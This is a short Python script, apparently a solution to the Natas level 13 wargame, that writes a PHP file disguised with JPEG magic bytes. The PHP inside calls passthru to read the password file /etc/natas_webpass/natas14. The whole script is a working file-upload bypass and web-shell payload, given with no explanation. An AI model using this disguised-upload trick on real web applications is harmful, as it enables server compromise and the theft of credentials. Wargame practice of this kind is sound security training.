#!/usr/bin/env python
with open('natas13_1.php', 'w') as fh:
    fh.write('\xFF\xD8\xFF\xE0' + '<? passthru("cat /etc/natas_webpass/natas14"); ?>')
